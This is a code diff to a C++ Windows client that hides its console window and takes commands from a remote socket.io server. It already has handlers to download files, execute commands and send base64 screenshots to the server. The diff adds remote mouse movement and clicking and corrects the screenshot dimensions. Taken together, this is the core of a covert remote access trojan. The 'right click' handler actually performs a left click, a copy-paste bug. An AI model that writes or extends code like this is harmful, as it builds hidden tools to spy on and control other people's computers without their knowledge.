@@ -23,6 +23,7 @@
 #include <algorithm>
 #include "screen.h"
 #include "base64.h"
+#include "MouseController.hpp"
 
 #include <gdiplus.h>
 #pragma comment(lib, "Gdiplus.lib")
@@ -272,6 +273,8 @@ std::mutex _lock;
 
 int main() {
 
+	MouseController MC;
+
 	// hide console window
 	HWND hWnd = GetConsoleWindow();
 	ShowWindow(hWnd, SW_HIDE);
@@ -421,7 +424,7 @@ int main() {
 	}));
 
 
-
+	// download:
 	myClient.socket()->on("dl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
 		
 		//if (data->get_flag() == sio::message::flag_object) {
@@ -458,7 +461,7 @@ int main() {
 
 
 
-	
+	// execute:
 	myClient.socket()->on("ex", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
 
 		std::cout << "recieved exec." << std::endl;
@@ -482,6 +485,7 @@ int main() {
 
 	}));
 
+	// screenshot:
 	myClient.socket()->on("ss", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
 		
 		RECT      rc;
@@ -491,8 +495,8 @@ int main() {
 		//long nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
 		//long nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
 
-		long width = rc.bottom;
-		long height = rc.right;
+		long width = rc.right;
+		long height = rc.bottom;
 
 		if (width == 1500) {
 			width *= 2;
@@ -503,9 +507,49 @@ int main() {
 		POINT b{ width, height };
 
 		std::string encoded_string = screenshotToBase64(a, b);
-		//printf("\n%s\n", encoded_string);
 
 		myClient.socket()->emit("screenshot", encoded_string);
+	}));
+
+
+	// left click:
+	myClient.socket()->on("lcl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
+
+		std::cout << "recieved left click." << std::endl;
+
+		int x = data->get_map()["x"]->get_int();
+		int y = data->get_map()["y"]->get_int();
+
+		MC.moveAbs(x, y);
+		MC.leftClick();
+
+	}));
+
+	// right click:
+	myClient.socket()->on("rcl", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
+
+		std::cout << "recieved left click." << std::endl;
+
+		int x = data->get_map()["x"]->get_int();
+		int y = data->get_map()["y"]->get_int();
+
+		MC.moveAbs(x, y);
+		MC.leftClick();
+
+	}));
+
+	myClient.socket()->on("mvm", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
+
+		std::cout << "recieved move mouse." << std::endl;
+
+		int x = data->get_map()["x"]->get_int();
+		int y = data->get_map()["y"]->get_int();
+
+		printf("x: %d y: %d\n", x, y);
+
+		MC.moveAbs(x, y);
+		//MC.moveRel(100, 100);
+
 	}));
 	
 
